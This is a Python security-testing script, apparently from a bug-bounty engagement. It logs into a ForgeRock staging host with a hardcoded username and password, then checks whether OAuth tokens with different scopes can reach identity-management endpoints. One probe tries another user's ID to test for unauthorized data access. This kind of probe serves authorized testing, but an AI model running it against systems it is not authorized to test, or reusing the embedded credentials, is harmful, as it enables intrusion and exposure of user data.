# -*- coding: utf-8 -*-
"""AIC 第三十四轮:token 类型 × 端点面 交叉矩阵(链路/组合思维,执行纪律第 6 条)
承诺(scope 语义):fr:idm:* 是访问 IDM 的门票,openid/fr:iga:* 不应访问 IDM 数据;
   反之 fr:idm:* 不应访问 IGA。
此前缺口:IDM 面只用 fr:idm:*+Cookie 测过(无法区分 token/会话权限),从未做 token 交叉对照。
本轮:3 token(openid/fr:iga:*/fr:idm:*)× IDM 9 端点 + IGA 2 端点,纯 Bearer 干净对照。
预期结果表:
  成立(漏洞) -> openid 或 fr:iga:* token 访问 IDM 数据端点(managed/user 列表等)返回 200 有数据
  不成立 -> 低权限 token 403/401,与 fr:idm:* 行为有差异(scope 隔离真实)
"""
import requests, urllib3, json, time
from urllib.parse import quote
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
TOKEN_EP = BASE + '/am/oauth2/realms/alpha/access_token'
RU = 'https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'
COOKIE_NAME = 'aa942d46ece12ce'
FORM = {'Content-Type': 'application/x-www-form-urlencoded'}

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

# 登录
r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
r2 = S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
tok = r2.json().get('tokenId')
S.headers.update({'Cookie': COOKIE_NAME + '=' + tok})
print('LOGIN OK')

def get_token(scope):
    p = '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&response_type=code' \
        '&redirect_uri=%s&scope=%s&state=t' % (quote(RU, safe=''), quote(scope, safe=''))
    r = S.get(BASE + p, timeout=15, verify=False, allow_redirects=False)
    loc = r.headers.get('Location', '')
    code = loc.split('code=')[1].split('&')[0] if 'code=' in loc else None
    if not code:
        print('authorize failed[%s]: %d %s' % (scope, r.status_code, loc[:120]))
        return None
    r2 = S.post(TOKEN_EP, data={'grant_type': 'authorization_code', 'code': code,
                                'redirect_uri': RU, 'client_id': 'endUserUIClient'},
                headers=FORM, timeout=12, verify=False)
    return r2.json().get('access_token')

TOKENS = {
    'openid': get_token('openid'),
    'fr:iga:*': get_token('openid fr:iga:*'),
    'fr:idm:*': get_token('openid fr:idm:*'),
}
for k, v in TOKENS.items():
    print('token[%-10s]:' % k, (v or 'NONE')[:40])

def probe(method, path, token, api_ver, body=None):
    """仅 Bearer,无 Cookie"""
    h = {'Authorization': 'Bearer ' + token, 'Accept-API-Version': api_ver,
         'Content-Type': 'application/json'}
    kw = {'headers': h, 'timeout': 12, 'verify': False}
    if body is not None:
        kw['json'] = body
    try:
        r = S.request(method, BASE + path, **kw)
        txt = r.text[:110].replace('\n', ' ')
        print('%-5s %-64s [%-9s] -> %d %s' % (method, path[:64], token[:9], r.status_code, txt))
        return r
    except Exception as e:
        print('%-5s %-64s [%-9s] -> ERR %s' % (method, path[:64], token[:9], str(e)[:60]))
        return None

print('\n=== IDM 面(9 端点 × 3 token,Bearer-only) ===')
IDM_EPS = [
    ('GET', '/openidm/privilege', 'resource=1.0'),
    ('GET', '/openidm/policy', 'resource=1.0'),
    ('GET', '/openidm/managed/user?_queryFilter=true', 'resource=1.0'),
    ('GET', '/openidm/managed/user/' + MY_ID, 'resource=1.0'),
    ('GET', '/openidm/roles?_queryFilter=true', 'resource=1.0'),
    ('GET', '/openidm/identities?_queryFilter=true', 'resource=1.0'),
    ('GET', '/openidm/config', 'resource=1.0'),
    ('GET', '/openidm/system', 'resource=1.0'),
    ('GET', '/openidm/endpoint/gettables', 'resource=1.0'),
]
for m, ep, ver in IDM_EPS:
    for tk in TOKENS:
        probe(m, ep, TOKENS[tk], ver)
        time.sleep(0.25)

print('\n=== IGA 面(2 端点 × 3 token,Bearer-only) ===')
IGA_EPS = [
    ('GET', '/iga/governance/user/%s/grants?pageSize=10&grantType=role' % MY_ID, 'resource=2.1, protocol=1.0'),
    ('GET', '/iga/governance/user/%s/grants?pageSize=10&grantType=role' % 'db3d6356-61a0-4684-9eaa-c1353dfa44d8', 'resource=2.1, protocol=1.0'),
]
for m, ep, ver in IGA_EPS:
    for tk in TOKENS:
        probe(m, ep, TOKENS[tk], ver)
        time.sleep(0.25)

print('\n=== IDM 面 Cookie 对照(fr:idm:* + Cookie vs Bearer-only) ===')
for ep, ver in [('/openidm/managed/user?_queryFilter=true', 'resource=1.0'),
                ('/openidm/privilege', 'resource=1.0')]:
    h = {'Authorization': 'Bearer ' + TOKENS['fr:idm:*'], 'Cookie': COOKIE_NAME + '=' + tok,
         'Accept-API-Version': ver, 'Content-Type': 'application/json'}
    try:
        r = S.get(BASE + ep, headers=h, timeout=12, verify=False)
        print('%-60s [fr:idm:*+Cookie] -> %d %s' % (ep[:60], r.status_code, r.text[:110].replace('\n', ' ')))
    except Exception as e:
        print('%-60s -> ERR %s' % (ep[:60], str(e)[:60]))
    time.sleep(0.25)
